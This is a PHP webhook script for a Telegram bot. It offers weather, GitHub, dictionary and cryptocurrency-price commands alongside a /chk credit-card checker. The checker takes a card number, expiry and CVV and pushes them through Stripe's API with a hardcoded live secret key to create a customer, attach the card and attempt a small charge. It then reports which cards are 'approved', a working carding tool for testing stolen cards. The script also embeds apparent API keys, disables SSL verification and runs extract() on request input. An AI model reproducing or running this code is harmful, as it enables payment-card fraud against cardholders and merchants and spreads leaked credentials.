<?php

    date_default_timezone_set("Asia/kolkata");
    //Data From Webhook
    $content = file_get_contents("php://input");
    $update = json_decode($content, true);
    $chat_id = $update["message"]["chat"]["id"];
    $message = $update["message"]["text"];
    $message_id = $update["message"]["message_id"];
    $id = $update["message"]["from"]["id"];
    $username = $update["message"]["from"]["username"];
    $firstname = $update["message"]["from"]["first_name"];
    $chatname = $_ENV['CHAT']; 
 /// for broadcasting in Channel
$channel_id = "-100xxxxxxxxxx";

/////////////////////////

    //Extact match Commands
    if($message == "/start"){
        send_message($chat_id,$message_id, "Hey $firstname \nUse /cmds to view commands \n$chatname");
    }

    if($message == "/cmds" || $message == "/cmds@github_rbot"){
        send_message($chat_id,$message_id, "
          /search <query> (Google search)
          \n/bin <bin> (Bin Data)
          \n/chk <cc> (Checker CC)
          \n/weather <name of your city> (Current weather Status)
          \n/dice <dice emoji>
          \n/date (today's date)
          \n/dict <word> (Dictionary)
          \n/time (current time) 
          \n/git <username> (Github User Info)
          \n/repodl <username/repo_name> (Download Github Repository)
          \n/cryptorate
          \n/toss (Random Heads or Tails)
          \n/syt <query> (Search on Youtube)
          \n/info (User Info)
          ");
    }
      if($message == "/cryptorate" || $message == "/cryptorate@github_rbot"){
      
        send_message($chat_id,$message_id,"
	 Use command to check current Crypto rates
         \n/btcrate  Bitcoin rate
         \n/ethrate  Etherum rate
         \n/ltcrate  Litecoin rate
         ");
    }

    if($message == "/date"){
        $date = date("d/m/y");
        send_message($chat_id,$message_id, $date);
    }
   if($message == "/help"){
        $help = "Contact @reboot13_dev";
        send_message($chat_id,$message_id, $help);
    }
   if($message == "/time"){
        $time = date("h:i a", time());
        send_message($chat_id,$message_id, "$time IST");
    }

  if($message == "/sc" || $message == "/si" || $message == "/st" || $message == "/cs" || $message == "/ua" || $message == "/at"  ){
   $botdown = "@WorldCheckerBot is under Maintenance";
        send_message($chat_id,$message_id, $botdown);
    }

if($message == "/dice"){
        sendDice($chat_id,$message_id, "🎲");
    }


    

if($message == "/toss"){
      $toss =array("Heads","Tails","Heads","Tails","Heads");
    $random_toss=array_rand($toss,4);
    $tossed = $toss[$random_toss[0]];
        send_message($chat_id,$message_id, "$tossed \nTossed By: @$username");
    }

     if($message == "/info"){
        send_message($chat_id,$message_id, "User Info \nName: $firstname\nID:$id \nUsername: @$username");
    }




///Commands with text


    //Google Search
if (strpos($message, "/search") === 0) {
        $search = substr($message, 8);
         $search = preg_replace('/\s+/', '+', $search);
$googleSearch = "[View On Web](https://www.google.com/search?q=$search)";
    if ($googleSearch != null) {
     send_MDmessage($chat_id,$message_id, $googleSearch);
    }
  }

if (strpos($message, "/repodl") === 0) {
$gitdlurl = substr($message, 8);
$gitdlurl1 = "[Click here](https://github.com/$gitdlurl/archive/master.zip)";
if ($gitdlurl != null) {
  send_MDmessage($chat_id,$message_id, "https://github.com/$gitdlurl/archive/main.zip
 \n⬇️In Case of no preview⬇️ \n$gitdlurl1"  );
}
}

//Youtube Search
if (strpos($message, "/syt") === 0) {
$syt = substr($message, 5);
$syt = preg_replace('/\s+/', '+', $syt);
$yurl = "[Open Youtube](https://www.youtube.com/results?search_query=$syt)";
if ($syt != null) {
  send_MDmessage($chat_id,$message_id, $yurl);
}
}


///Channel BroadCast
if (strpos($message, "/broadcast") === 0) {
$broadcast = substr($message, 11);
if ($id == 1171876903 /*|| $id == 1478297206 || $id == 654455829 || $id == 638178378 || $id == 971532801*/ ) { // || uncomment for multiple admins
  send_Cmessage($channel_id, $broadcast);
}
else {
    send_message($chat_id,$message_id, "You are not authorized to use this command");
 // example
///send_message("-100xxxxxxxxxx",$message_id, "You are not authorized to use this command");
///send_message("@channel_username",$message_id, "You are not authorized to use this command");
/// You can add as many channel and chat you want use the above format (make sure bot is promoted as admin in chat and channel)
}

}


//Bin Lookup
if(strpos($message, "/bin") === 0){
    $bin = substr($message, 5);
    $curl = curl_init();
    curl_setopt_array($curl, [
    CURLOPT_URL => "https://binssuapi.vercel.app/api/".$bin,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => [
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
    "sec-fetch-dest: document",
    "sec-fetch-site: none",
    "user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
   ],
   ]);

 $result = curl_exec($curl);
 curl_close($curl);
 $data = json_decode($result, true);
 $bank = $data['data']['bank'];
 $country = $data['data']['country'];
 $brand = $data['data']['vendor'];
 $level = $data['data']['level'];
 $type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
 $result1 = $data['result'];

    if ($result1 == true) {
    send_MDmessage($chat_id,$message_id, "***✅ Valid BIN
Bin: $bin
Brand: $brand
Level: $level
Bank: $bank
Country: $country $flag
Type:$type
Checked By @$username ***");
    }
else {
    send_MDmessage($chat_id,$message_id, "***Enter Valid BIN***");
}
}

    //Wheather API
if(strpos($message, "/weather") === 0){
        $location = substr($message, 9);
        $weatherToken = "89ef8a05b6c964f4cab9e2f97f696c81"; ///get api key from openweathermap.org

   $curl = curl_init();
   curl_setopt_array($curl, [
CURLOPT_URL => "http://api.openweathermap.org/data/2.5/weather?q=$location&appid=$weatherToken",
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 10,
	CURLOPT_TIMEOUT => 50,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => "GET",
	CURLOPT_HTTPHEADER => [
		"Accept: */*",
        "Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
        "Host: api.openweathermap.org",
        "sec-fetch-dest: empty",
		"sec-fetch-site: same-site"
  ],
]);


$content = curl_exec($curl);
curl_close($curl);
$resp = json_decode($content, true);

$weather = $resp['weather'][0]['main'];
$description = $resp['weather'][0]['description'];
$temp = $resp['main']['temp'];
$humidity = $resp['main']['humidity'];
$feels_like = $resp['main']['feels_like'];
$country = $resp['sys']['country'];
$name = $resp['name'];
$kelvin = 273;
$celcius = $temp - $kelvin;
$feels = $feels_like - $kelvin;

if ($location = $name) {
        send_MDmessage($chat_id,$message_id, "***
Weather at $location: $weather
Status: $description
Temp : $celcius °C
Feels Like : $feels °C
Humidity: $humidity
Country: $country 
Checked By @$username ***");
}
else {
           send_message($chat_id,$message_id, "Invalid City");
}
    }

///Github User API
if(strpos($message, "/git") === 0){
  $git = substr($message, 5);
   $curl = curl_init();
   curl_setopt_array($curl, [
CURLOPT_URL => "https://api.github.com/users/$git",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 50,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_HTTPHEADER => [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding: gzip, deflate, br",
    "Accept-Language: en-GB,en;q=0.9",
    "Host: api.github.com",
    "Sec-Fetch-Dest: document",
    "Sec-Fetch-Mode: navigate",
    "Sec-Fetch-Site: none",
    "Sec-Fetch-User: ?1",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
  ],
]);


$github = curl_exec($curl);
curl_close($curl);
$gresp = json_decode($github, true);

$gusername = $gresp['login'];
$glink = $gresp['html_url'];
$gname = $gresp['name'];
$gcompany = $gresp['company'];
$blog = $gresp['blog'];
$gbio = $gresp['bio'];
$grepo = $gresp['public_repos'];
$gfollowers = $gresp['followers'];
$gfollowings = $gresp['following'];


if ($gusername) {
        send_MDmessage($chat_id,$message_id, " ***
Name: $gname
Username: $gusername
Bio: $gbio
Followers: $gfollowers
Following : $gfollowings
Repositories: $grepo
Website: $blog
Company: $gcompany
Github url: $glink
Checked By @$username ***");
}
else {
           send_message($chat_id,$message_id, "User Not Found \nInvalid github username checked by @$username");
}
    }

 /// BTC rate
if(strpos($message, "/btcrate") === 0){
   $curl = curl_init();
   curl_setopt_array($curl, [
CURLOPT_URL => "https://api.coinbase.com/v2/prices/BTC-USD/spot",
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 10,
	CURLOPT_TIMEOUT => 50,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => "GET",
	CURLOPT_HTTPHEADER => [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding: gzip, deflate, br",
        "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7", 
"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
  ],
]);
$btcvalue = curl_exec($curl);
curl_close($curl);
$currentBTCvalue = json_decode($btcvalue, true);

$BTCvalueinUSD = $currentBTCvalue["data"]["amount"];

send_MDmessage($chat_id,$message_id, "***1 BTC \nUSD = $BTCvalueinUSD $ \nRate checked by @$username ***");
}

/// ETH rate
if(strpos($message, "/ethrate") === 0){
   $curl = curl_init();
   curl_setopt_array($curl, [
CURLOPT_URL => "https://api.coinbase.com/v2/prices/ETH-USD/spot",
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 10,
	CURLOPT_TIMEOUT => 50,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => "GET",
	CURLOPT_HTTPHEADER => [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding: gzip, deflate, br",
        "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7", 
"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
  ],
]);
$ethvalue = curl_exec($curl);
curl_close($curl);
$currentETHvalue = json_decode($ethvalue, true);

$ethValueInUSD = $currentETHvalue["data"]["amount"];
send_MDmessage($chat_id,$message_id, "***1 ETH \nUSD = $ethValueInUSD $ \nRate checked by @$username ***");
}

/// LTC Rate
if(strpos($message, "/ltcrate") === 0){
   $curl = curl_init();
   curl_setopt_array($curl, [
CURLOPT_URL => "https://api.coinbase.com/v2/prices/LTC-USD/spot",
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => true,
	CURLOPT_ENCODING => "",
	CURLOPT_MAXREDIRS => 10,
	CURLOPT_TIMEOUT => 50,
	CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
	CURLOPT_CUSTOMREQUEST => "GET",
	CURLOPT_HTTPHEADER => [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding: gzip, deflate, br",
        "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7", 
"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
  ],
]);
$ltcvalue = curl_exec($curl);
curl_close($curl);
$currentLTCvalue = json_decode($ltcvalue, true);

$LTCvalueinUSD = $currentLTCvalue["data"]["amount"];

send_MDmessage($chat_id,$message_id, "***1 LTC \nUSD = $LTCvalueinUSD $ \nRate checked by @$username ***");
}


///CC CHECKER
if (strpos($message, "/chk") === 0){
$lista = substr($message, 5);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon   = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mon = $separa[1];
$year = $separa[2];
$cvv = $separa[3];

$skeys = array(
  1 => 'sk_live_69GKI0saLB8uIEnxzv8VTvRX', // Enter at least one sk key
//2 => 'Enter ur sk keys here',-----------------|
//3 => 'Enter ur sk keys here',                 | Uncomment this, if you want to add more sk keys :)
//4 => 'Enter ur sk keys here',                 |
//5 => 'Enter ur sk keys here',-----------------|
); 
$skey = array_rand($skeys);
$sk = $skeys[$skey];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
};
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Alina Rebeckert');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$id = trim(strip_tags(GetStr($f,'"id": "','"')));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded',));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mon.'&payment_method_data[card][exp_year]='.$year.'&payment_method_data[card][cvc]='.$cvv.'');
$result = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
$time = substr($time, 0, 4);
$c = json_decode(curl_exec($ch), true);
curl_close($ch);
$pam = trim(strip_tags(GetStr($result,'"payment_method": "','"')));
$cvv = trim(strip_tags(GetStr($result,'"cvc_check": "','"')));
if ($c["status"] == "succeeded"){ 
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');  
$result = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
$attachment_to_her = json_decode(curl_exec($ch), true);
curl_close($ch);
$attachment_to_her;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-Type: application/x-www-form-urlencoded'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '&amount=100&currency=usd&customer='.$id.'');
$result = curl_exec($ch);
if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass"){  
$skresult = "APPROVED! 🟢";
$skresponse = "CVV MATCHES!";
}else{
$skresult = "UNCHECKED 🔴";
$skresponse = "UNAVAILABLE";
}}
elseif(strpos($result, '"cvc_check": "pass"')){
$skresult = "APPROVED 🟢";
$skresponse = "OLD CVV!";
}
elseif(strpos($result, 'security code is incorrect')){
$skresult = "APPROVED! 🟢";
$skresponse = "CCN APPROVED!";
}
elseif (isset($c["error"])){
$skresult = "DECLINED! 🔴";
$skresponse = ''. $c["error"]["message"] . ' ' . $c["error"]["decline_code"] .'';
}else{
$skresult = "UNCHECKED 🔴";
$skresponse = "GATE FUCKED!";
};
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);


send_MDmessage($chat_id,$message_id, "
CARD: $lista
STATUS: $skresult
RESPONSE: $skresponse

----- BinData -----
Bank: $bank
Country: $name
Brand: $brand
Card: $scheme
Type: $type
--------------------

Checked By: @$username2
Time Taken: $time s

Bot Made by: @X_ImFine");

}


///Dictionary API
 if(strpos($message, "/dict") === 0){
  $dict = substr($message, 6);
  $curl = curl_init();
  curl_setopt_array($curl, [
  CURLOPT_URL => "https://api.dictionaryapi.dev/api/v2/entries/en/$dict",
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_ENCODING => "",
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => "GET",
  CURLOPT_HTTPHEADER => [
    "accept: */*",
    "accept-encoding: gzip, deflate, br",
    "accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
    "origin: https://google-dictionary.vercel.app",
    "referer: https://google-dictionary.vercel.app/",
    "sec-fetch-dest: empty",
    "sec-fetch-mode: cors",
    "sec-fetch-site: cross-site",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36"
        ],
]);


  $dictionary = curl_exec($curl);
  curl_close($curl);

$out = json_decode($dictionary, true);
$definition0 = $out[0]['meanings'][0]['definitions'][0]["definition"];
$definition1 = $out[0]['meanings'][1]['definitions'][0]["definition"];

$example = $out[0]['meanings'][0]['definitions'][0]["example"];

$Voiceurl = $out[0]["phonetics"][0]["audio"];

if ($definition0 != null) {
        send_MDmessage($chat_id,$message_id, "***
Word: $dict
meanings : 
1:$definition0
2:$definition1
Example : $example
Pronunciation : $Voiceurl
Checked By @$username ***");
    }
    else {
        send_message($chat_id,$message_id, "Invalid Input");
    }
}
///Send Message (Global)
    function send_message($chat_id,$message_id, $message){
        $text = urlencode($message);
        $apiToken = $_ENV['API_TOKEN'];  
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text");
    }
    
//Send Messages with Markdown (Global)
      function send_MDmessage($chat_id,$message_id, $message){
        $text = urlencode($message);
        $apiToken = $_ENV['API_TOKEN'];  
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&reply_to_message_id=$message_id&text=$text&parse_mode=Markdown");
    }
///Send Message to Channel
      function send_Cmessage($channel_id, $message){
        $text = urlencode($message);
        $apiToken = $_ENV['API_TOKEN'];
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$channel_id&text=$text");
    }

//Send Dice (dynamic emoji)
function sendDice($chat_id,$message_id, $message){
        $apiToken = $_ENV['API_TOKEN'];  
        file_get_contents("https://api.telegram.org/bot$apiToken/sendDice?chat_id=$chat_id&reply_to_message_id=$message_id&text=$message");
    }


?>
